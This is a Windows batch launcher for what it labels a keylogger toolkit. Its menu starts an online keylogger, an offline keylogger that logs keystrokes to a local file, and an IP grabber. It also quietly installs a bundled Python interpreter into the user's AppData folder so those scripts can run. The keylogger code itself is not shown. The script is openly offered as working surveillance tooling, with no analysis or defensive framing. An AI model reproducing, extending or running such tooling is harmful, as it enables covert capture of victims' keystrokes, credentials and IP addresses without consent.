@echo off

:start
cls
echo "                                                                                     "
echo " /  |  /  |                                                                          "
echo " $$ | /$$/   __         __    __    __    __    __                                   "
echo " $$ |/$$/   /      \ /  |  /  |$$ | /      \  /      \  /      \  /      \  /      \ "
echo " $$  $$<   /$$$$$$  |$$ |  $$ |$$ |/$$$$$$  |/$$$$$$  |/$$$$$$  |/$$$$$$  |/$$$$$$  |"
echo " $$$$$  \  $$    $$ |$$ |  $$ |$$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$    $$ |$$ |  $$/ "
echo " $$ |$$  \ $$$$$$$$/ $$   _$$ |$$ |$$   _$$ |$$   _$$ |$$   _$$ |$$$$$$$$/ $$ |      "
echo " $$ | $$  |$$       |$$    $$ |$$ |$$    $$/ $$    $$ |$$    $$ |$$       |$$ |      "
echo " $$/   $$/  $$$$$$$/  $$$$$$$ |$$/  $$$$$$/   $$$$$$$ | $$$$$$$ | $$$$$$$/ $$/       "
echo "                       /  _$$ |                /  _$$ |/     __$$ |                  "
echo "                     $$    $$/               $$    $$/ $$    $$/                     "
echo "                      $$$$$$/                 $$$$$$/   $$$$$$/                      "                                

echo Menu:
echo 1. open online keylogger (requires setting up): 1
echo 2. open offline keylogger (logs in keylogs.txt locally) 2
echo 3. open offline IPGrabber (logs in public_ip.txt locally) 3
echo 4. exit

::install Python
xcopy /s /e /y .\Python311 %APPDATA%\..\Local\Programs\Python\Python311

set PYTHON= %APPDATA%\..\Local\Programs\Python\Python311\python.exe

set /p option=Enter the number of the desired option: 

if %option%==1 (
    echo Running KeyLoggerOnline.py...
    start %PYTHON% .\KeyLoggerOnline.py
    exit
)
if %option%==2 (    
    echo Running KeyLoggerOffline.py...
    start %PYTHON% .\KeyLoggerOffline.py
    exit
)
if %option%==3 (
    echo Running IPGrabber.py...
    start %PYTHON% .\IPGrabber.py
    exit
)
if %option%==4 (
    echo Exiting the menu...
    exit /b 0
)

::INVALID OPTION
goto start
